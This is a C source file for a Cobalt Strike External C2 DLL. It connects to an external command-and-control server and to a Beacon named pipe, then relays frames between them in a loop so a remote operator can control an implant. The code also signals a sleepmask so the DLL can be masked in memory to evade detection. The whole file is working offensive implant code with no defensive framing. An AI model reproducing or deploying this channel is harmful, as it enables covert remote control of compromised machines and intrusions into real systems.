#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include "Debug.h"
#include "Extc2.h"
#include "Utils.h"

/**
* External C2 DLL's Main() function
* 
* Note: This is a slightly modified version of Raphael Mudge's original
* ExternalC2 example. It has been modified to read data using 
* non-blocking calls and uses event objects to facilitate masking 
* via Sleepmask-VS. 
* 
* https://hstechdocs.helpsystems.com/kbfiles/cobaltstrike/attachments/extc2example.c
*/
void go(PEXTC2_SYNC_INFO extC2Info) {
    SOCKET extC2ServerSocket = INVALID_SOCKET;
    HANDLE beaconPipeHandle = INVALID_HANDLE_VALUE;
    char* buffer = NULL;

    // Save the EXTC2_SYNC_INFO event handles locally
    EXTC2_SYNC_INFO localExtC2Info = { INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };
    if (extC2Info != NULL) {
        localExtC2Info = *(PEXTC2_SYNC_INFO)extC2Info;

        // Check the event handles...
        if (localExtC2Info.ExtC2Init == INVALID_HANDLE_VALUE || localExtC2Info.ExtC2StopEvent == INVALID_HANDLE_VALUE || localExtC2Info.ExtC2SleepEvent == INVALID_HANDLE_VALUE || localExtC2Info.ExtC2ContinueEvent == INVALID_HANDLE_VALUE) {
            DLOGF("EXTC2: Missing event handles. Exiting...\n");
            goto Cleanup;
        }
    }

    // Initialize the External C2 Server/Connection
    extC2ServerSocket = InitExternalC2();
    if (extC2ServerSocket == INVALID_SOCKET || extC2ServerSocket == SOCKET_ERROR) {
        DLOGF("EXTC2: Failed to initialize External C2 Server/Connection. Exiting...\n");
        goto Cleanup;
    }

    DLOGF("EXTC2: Connected to External C2!\n");
    
    // Connect to Beacon
    beaconPipeHandle = ConnectToBeaconPipe();
    if (beaconPipeHandle == INVALID_HANDLE_VALUE) {
        DLOGF("EXTC2: Failed to connect to Beacon. Exiting...\n");
        goto Cleanup;
    }

    DLOGF("EXTC2: Connected to Beacon!\n");

    // Let the Sleepmask know the External C2 DLL is operational
    SetEvent(localExtC2Info.ExtC2Init);

    // Allocate a buffer to store the C2 data
    buffer = (char*)malloc(BUFFER_MAX_SIZE);
    if (buffer == NULL) {
        goto Cleanup;
    }

    while (TRUE) {
        /**
        * Check whether the Sleepmask has signalled the stop event.
        * If the stop event is not signalled, continue immediately... 
        */
        DLOGF("EXTC2: Check ExtC2StopEvent\n");
        if (WaitForSingleObject(localExtC2Info.ExtC2StopEvent, 0) == WAIT_OBJECT_0) {
            /**
            * Let the Sleepmask know this thread is sleeping and
            * wait for the Sleepmask to signal the Continue event.
            * 
            * Note: This allows the Sleepmask to mask the External C2 Dll
            */
            DLOGF("EXTC2: Set ExtC2SleepEvent and wait for ExtC2ContinueEvent\n"); 
            DWORD waitStatus = SignalObjectAndWait(localExtC2Info.ExtC2SleepEvent, localExtC2Info.ExtC2ContinueEvent, 30000, FALSE);
            if (waitStatus == WAIT_TIMEOUT) {
                break;
            }
        }

        DLOGF("EXTC2: Read frame from Beacon\n");
        int bytesReadFromBeacon = ReadFrameFromBeaconPipe(beaconPipeHandle, buffer);
        if (bytesReadFromBeacon >= 0) {
            /**
            * The External C2 server sits in blocking mode whilst waiting for a reponse.
            * Therefore, we must always send the empty packets as well.
            */
            DLOGF("EXTC2: Send frame to External C2 server\n");
            if (!SendFrameToExtC2Server(extC2ServerSocket, buffer, bytesReadFromBeacon)) {
                DLOGF("EXTC2: Failed to send frame. Exiting...\n");
                break;
            }
        }
        else if (bytesReadFromBeacon == EXTC2PIPE_READ_ERROR) {
            break;
        }

        int bytesFromExtC2 = ReceiveFrameFromExtC2Server(extC2ServerSocket, buffer);
        DLOGF("EXTC2: Received %d bytes from External C2 server\n", bytesFromExtC2);
        if(bytesFromExtC2 > 0) {
            DLOGF("EXTC2: Writing %d bytes to Beacon pipe\n", bytesFromExtC2);
            if (!WriteFrameToBeaconPipe(beaconPipeHandle, buffer, bytesFromExtC2)) {
                DLOGF("EXTC2: Failed to send frame. Exiting...\n");
                break;
            }
        }
        else if (bytesFromExtC2 == EXTC2SOCKET_READ_ERROR) {
            break;
        }

        // A small sleep before restarting the loop
        Sleep(300);
    }

Cleanup:
    // Close the open handles
    DLOGF("EXTC2: Cleaning up and exiting...\n");
    FREE_BUFFER(buffer);
    CLOSE_HANDLE(localExtC2Info.ExtC2Init);
    CLOSE_HANDLE(localExtC2Info.ExtC2StopEvent);
    CLOSE_HANDLE(localExtC2Info.ExtC2SleepEvent);
    CLOSE_HANDLE(localExtC2Info.ExtC2ContinueEvent);
    CLOSE_HANDLE(beaconPipeHandle);
    CLOSE_SOCKET(extC2ServerSocket);
    ExitThread(0);
}
